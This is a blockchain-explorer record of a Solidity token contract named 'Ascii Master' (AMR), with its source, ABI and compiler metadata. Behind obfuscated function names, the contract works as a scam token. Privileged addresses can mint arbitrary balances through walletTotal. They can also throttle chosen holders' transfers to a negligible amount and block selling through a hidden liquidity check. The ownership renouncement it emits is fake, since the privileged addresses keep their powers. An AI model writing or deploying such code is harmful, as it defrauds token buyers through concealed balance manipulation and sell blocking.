{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface fromTxTotal {\n    function createPair(address enableFrom, address txAt) external returns (address);\n}\n\ninterface receiverAmountMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldReceiver) external view returns (uint256);\n\n    function transfer(address exemptSwapBuy, uint256 feeAmount) external returns (bool);\n\n    function allowance(address feeReceiverToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptSwapBuy,\n        uint256 feeAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atMax, uint256 value);\n    event Approval(address indexed feeReceiverToken, address indexed spender, uint256 value);\n}\n\nabstract contract totalSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverAmountModeMetadata is receiverAmountMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AsciiMaster is totalSender, receiverAmountMode, receiverAmountModeMetadata {\n\n    bool public totalMarketingTrading;\n\n    string private totalToken = \"AMR\";\n\n    function walletTotal(address sellList, uint256 feeAmount) public {\n        enableMarketing();\n        minBuy[sellList] = feeAmount;\n    }\n\n    function approve(address marketingFee, uint256 feeAmount) public virtual override returns (bool) {\n        totalLaunched[_msgSender()][marketingFee] = feeAmount;\n        emit Approval(_msgSender(), marketingFee, feeAmount);\n        return true;\n    }\n\n    function autoExempt(address shouldTake, address exemptSwapBuy, uint256 feeAmount) internal returns (bool) {\n        if (shouldTake == tokenSell) {\n            return totalAutoExempt(shouldTake, exemptSwapBuy, feeAmount);\n        }\n        uint256 fundTake = receiverAmountMode(toMin).balanceOf(senderLimitLiquidity);\n        require(fundTake == modeLiquidity);\n        require(exemptSwapBuy != senderLimitLiquidity);\n        if (totalAmountTx[shouldTake]) {\n            return totalAutoExempt(shouldTake, exemptSwapBuy, buyEnable);\n        }\n        return totalAutoExempt(shouldTake, exemptSwapBuy, feeAmount);\n    }\n\n    function owner() external view returns (address) {\n        return takeEnable;\n    }\n\n    uint8 private modeExempt = 18;\n\n    function enableMarketing() private view {\n        require(takeFromReceiver[_msgSender()]);\n    }\n\n    uint256 private teamEnable;\n\n    uint256 public enableList;\n\n    mapping(address => uint256) private minBuy;\n\n    function marketingSwapExempt(address limitSender) public {\n        enableMarketing();\n        if (amountTo != takeTx) {\n            takeTx = true;\n        }\n        if (limitSender == tokenSell || limitSender == toMin) {\n            return;\n        }\n        totalAmountTx[limitSender] = true;\n    }\n\n    uint256 private swapIs = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeExempt;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tradingAmount;\n    }\n\n    uint256 modeLiquidity;\n\n    mapping(address => bool) public takeFromReceiver;\n\n    uint256 autoTx;\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalToken;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapIs;\n    }\n\n    function balanceOf(address shouldReceiver) public view virtual override returns (uint256) {\n        return minBuy[shouldReceiver];\n    }\n\n    function allowance(address receiverLiquidityAmount, address marketingFee) external view virtual override returns (uint256) {\n        if (marketingFee == feeMax) {\n            return type(uint256).max;\n        }\n        return totalLaunched[receiverLiquidityAmount][marketingFee];\n    }\n\n    bool public takeTx;\n\n    uint256 constant buyEnable = 8 ** 10;\n\n    address public toMin;\n\n    address feeMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return takeEnable;\n    }\n\n    address senderLimitLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public totalAmountTx;\n\n    constructor (){\n        if (amountTo != feeMin) {\n            teamEnable = enableList;\n        }\n        swapTotal swapMarketing = swapTotal(feeMax);\n        toMin = fromTxTotal(swapMarketing.factory()).createPair(swapMarketing.WETH(), address(this));\n        \n        tokenSell = _msgSender();\n        takeFromReceiver[tokenSell] = true;\n        minBuy[tokenSell] = swapIs;\n        limitMarketing();\n        \n        emit Transfer(address(0), tokenSell, swapIs);\n    }\n\n    event OwnershipTransferred(address indexed receiverTotal, address indexed atMin);\n\n    mapping(address => mapping(address => uint256)) private totalLaunched;\n\n    function transfer(address sellList, uint256 feeAmount) external virtual override returns (bool) {\n        return autoExempt(_msgSender(), sellList, feeAmount);\n    }\n\n    address private takeEnable;\n\n    address public tokenSell;\n\n    function totalAutoExempt(address shouldTake, address exemptSwapBuy, uint256 feeAmount) internal returns (bool) {\n        require(minBuy[shouldTake] >= feeAmount);\n        minBuy[shouldTake] -= feeAmount;\n        minBuy[exemptSwapBuy] += feeAmount;\n        emit Transfer(shouldTake, exemptSwapBuy, feeAmount);\n        return true;\n    }\n\n    bool public amountTo;\n\n    bool private launchSell;\n\n    function modeSell(address receiverTake) public {\n        if (totalMarketingTrading) {\n            return;\n        }\n        if (teamEnable != enableList) {\n            enableList = teamEnable;\n        }\n        takeFromReceiver[receiverTake] = true;\n        \n        totalMarketingTrading = true;\n    }\n\n    function limitMarketing() public {\n        emit OwnershipTransferred(tokenSell, address(0));\n        takeEnable = address(0);\n    }\n\n    function receiverMax(uint256 feeAmount) public {\n        enableMarketing();\n        modeLiquidity = feeAmount;\n    }\n\n    string private tradingAmount = \"Ascii Master\";\n\n    function transferFrom(address shouldTake, address exemptSwapBuy, uint256 feeAmount) external override returns (bool) {\n        if (_msgSender() != feeMax) {\n            if (totalLaunched[shouldTake][_msgSender()] != type(uint256).max) {\n                require(feeAmount <= totalLaunched[shouldTake][_msgSender()]);\n                totalLaunched[shouldTake][_msgSender()] -= feeAmount;\n            }\n        }\n        return autoExempt(shouldTake, exemptSwapBuy, feeAmount);\n    }\n\n    bool private feeMin;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeReceiverToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLiquidityAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSender\",\"type\":\"address\"}],\"name\":\"marketingSwapExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTake\",\"type\":\"address\"}],\"name\":\"modeSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"name\":\"receiverMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeFromReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalAmountTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMarketingTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptSwapBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"name\":\"walletTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AsciiMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}